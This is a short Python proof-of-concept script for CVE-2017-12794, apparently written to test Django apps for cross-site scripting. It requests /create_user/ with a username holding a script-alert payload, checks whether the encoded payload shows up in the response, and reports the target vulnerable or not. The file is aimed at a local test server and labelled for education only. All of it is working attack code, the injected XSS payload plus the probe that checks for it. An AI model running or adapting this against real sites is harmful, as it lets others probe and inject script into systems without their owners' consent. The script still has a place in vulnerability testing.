#!/usr/bin/env python
#__author__ == 'Kios'
#__Email__ == 'root@mkernel.com'

import requests

class PoC(object):
    '''
    CVE-2017-12794 PoC
    Education Purpose Only! Do not use illgal way!
    '''
    def __init__(self, url):
        '''
        Initialize
        '''
        self.url = url
        
    def _XSS(self):
        '''
        construct XSS url
        '''
        _xss_url = self.url + '/create_user/?username=<script>alert(1)</script>'
        r = requests.get(_xss_url)
        #print(r.text)
        if '%3Cscript%3Ealert(1)%3C/script%3E' in r.text:
            return True
        else:
            return False
        
    def run(self):
        '''
        Run Poc
        '''
        flag = self._XSS()
        if flag == True:
            print('Django is Vulnerable!')
        else:
            print('Django is not Vulnerable!')

if __name__ == '__main__':
    obj1 = PoC('http://127.0.0.1:8000')
    obj1.run()
    